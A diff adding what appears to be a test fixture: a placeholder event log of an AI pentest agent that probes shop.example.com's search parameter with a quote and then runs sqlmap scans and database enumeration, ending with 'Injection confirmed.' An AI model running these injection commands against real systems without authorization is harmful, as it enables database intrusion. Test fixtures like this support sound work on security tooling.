@@ -1,0 +1,312 @@
+{
+ "meta": {
+  "id": "session_userflow0000001",
+  "title": "Own SQLi flow",
+  "status": "active",
+  "currentPhase": "informational",
+  "iterationCount": 5,
+  "createdAt": "2026-10-10T09:00:00Z",
+  "updatedAt": "2026-10-10T09:01:17.000Z",
+  "running": false,
+  "highWaterSeq": 24
+ },
+ "events": [
+  {
+   "seq": 1,
+   "type": "user_message",
+   "at": "2026-10-10T09:00:07.000Z",
+   "data": {
+    "content": "Use my flow on shop.example.com."
+   }
+  },
+  {
+   "seq": 2,
+   "type": "phase_update",
+   "at": "2026-10-10T09:00:08.000Z",
+   "data": {
+    "current_phase": "informational",
+    "iteration_count": 0,
+    "attack_path_type": "",
+    "skill_workflow": null
+   }
+  },
+  {
+   "seq": 3,
+   "type": "phase_update",
+   "at": "2026-10-10T09:00:09.000Z",
+   "data": {
+    "current_phase": "informational",
+    "iteration_count": 1,
+    "attack_path_type": "user_skill:cuserflow0000000000000001",
+    "skill_workflow": {
+     "skillId": "user_skill:cuserflow0000000000000001",
+     "kind": "user",
+     "contentSha256": "ef7440d170bd6586"
+    }
+   }
+  },
+  {
+   "seq": 4,
+   "type": "thinking",
+   "at": "2026-10-10T09:00:16.000Z",
+   "data": {
+    "iteration": 1,
+    "phase": "informational",
+    "thought": "Find the forms.",
+    "reasoning": "Reasoning for turn 1.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "seq": 5,
+   "type": "tool_start",
+   "at": "2026-10-10T09:00:17.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s 'http://shop.example.com/search'"
+    },
+    "step_id": "step-0001-execute_curl"
+   }
+  },
+  {
+   "seq": 7,
+   "type": "tool_complete",
+   "at": "2026-10-10T09:00:20.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": true,
+    "output_summary": "ok",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s 'http://shop.example.com/search'"
+    },
+    "raw_output": "<form>",
+    "step_id": "step-0001-execute_curl"
+   }
+  },
+  {
+   "seq": 8,
+   "type": "thinking",
+   "at": "2026-10-10T09:00:27.000Z",
+   "data": {
+    "iteration": 2,
+    "phase": "informational",
+    "thought": "Quote the parameter.",
+    "reasoning": "Reasoning for turn 2.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "seq": 9,
+   "type": "tool_start",
+   "at": "2026-10-10T09:00:28.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s 'http://shop.example.com/search?q=%27'"
+    },
+    "step_id": "step-0002-execute_curl"
+   }
+  },
+  {
+   "seq": 11,
+   "type": "tool_complete",
+   "at": "2026-10-10T09:00:31.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": true,
+    "output_summary": "ok",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s 'http://shop.example.com/search?q=%27'"
+    },
+    "raw_output": "SQL syntax error",
+    "step_id": "step-0002-execute_curl"
+   }
+  },
+  {
+   "seq": 12,
+   "type": "thinking",
+   "at": "2026-10-10T09:00:38.000Z",
+   "data": {
+    "iteration": 3,
+    "phase": "informational",
+    "thought": "sqlmap crawl.",
+    "reasoning": "Reasoning for turn 3.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "red",
+    "stall": 2
+   }
+  },
+  {
+   "seq": 13,
+   "type": "tool_start",
+   "at": "2026-10-10T09:00:39.000Z",
+   "data": {
+    "tool_name": "kali_shell",
+    "tool_args": {
+     "command": "sqlmap -u 'http://shop.example.com/' --crawl=3 --batch"
+    },
+    "step_id": "step-0003-kali_shell"
+   }
+  },
+  {
+   "seq": 15,
+   "type": "tool_complete",
+   "at": "2026-10-10T09:00:42.000Z",
+   "data": {
+    "tool_name": "kali_shell",
+    "success": false,
+    "output_summary": "failed",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "command": "sqlmap -u 'http://shop.example.com/' --crawl=3 --batch"
+    },
+    "raw_output": "[WARNING] crawl stalled",
+    "step_id": "step-0003-kali_shell"
+   }
+  },
+  {
+   "seq": 16,
+   "type": "thinking",
+   "at": "2026-10-10T09:00:49.000Z",
+   "data": {
+    "iteration": 4,
+    "phase": "informational",
+    "thought": "sqlmap on one parameter.",
+    "reasoning": "Reasoning for turn 4.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "seq": 17,
+   "type": "tool_start",
+   "at": "2026-10-10T09:00:50.000Z",
+   "data": {
+    "tool_name": "kali_shell",
+    "tool_args": {
+     "command": "sqlmap -u 'http://shop.example.com/search?q=1' -p q --batch"
+    },
+    "step_id": "step-0004-kali_shell"
+   }
+  },
+  {
+   "seq": 19,
+   "type": "tool_complete",
+   "at": "2026-10-10T09:00:53.000Z",
+   "data": {
+    "tool_name": "kali_shell",
+    "success": true,
+    "output_summary": "ok",
+    "actionable_findings": [
+     "SQL injection in parameter q"
+    ],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "command": "sqlmap -u 'http://shop.example.com/search?q=1' -p q --batch"
+    },
+    "raw_output": "Parameter 'q' is vulnerable",
+    "step_id": "step-0004-kali_shell"
+   }
+  },
+  {
+   "seq": 20,
+   "type": "thinking",
+   "at": "2026-10-10T09:01:00.000Z",
+   "data": {
+    "iteration": 5,
+    "phase": "informational",
+    "thought": "Confirm.",
+    "reasoning": "Reasoning for turn 5.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "seq": 21,
+   "type": "tool_start",
+   "at": "2026-10-10T09:01:01.000Z",
+   "data": {
+    "tool_name": "kali_shell",
+    "tool_args": {
+     "command": "sqlmap -u 'http://shop.example.com/search?q=1' -p q --dbs --batch"
+    },
+    "step_id": "step-0005-kali_shell"
+   }
+  },
+  {
+   "seq": 22,
+   "type": "tool_complete",
+   "at": "2026-10-10T09:01:03.000Z",
+   "data": {
+    "tool_name": "kali_shell",
+    "success": true,
+    "output_summary": "ok",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "command": "sqlmap -u 'http://shop.example.com/search?q=1' -p q --dbs --batch"
+    },
+    "raw_output": "available databases [2]",
+    "step_id": "step-0005-kali_shell"
+   }
+  },
+  {
+   "seq": 23,
+   "type": "assistant_message",
+   "at": "2026-10-10T09:01:10.000Z",
+   "data": {
+    "content": "Injection confirmed.",
+    "phase": "informational",
+    "task_complete": true,
+    "response_tier": "full_report"
+   }
+  },
+  {
+   "seq": 24,
+   "type": "task_complete",
+   "at": "2026-10-10T09:01:17.000Z",
+   "data": {
+    "message": "Task completed successfully",
+    "final_phase": "informational",
+    "total_iterations": 5
+   }
+  }
+ ],
+ "truncated": {
+  "keptEvents": 20,
+  "droppedEvents": 4
+ },
+ "untrusted": true
+}
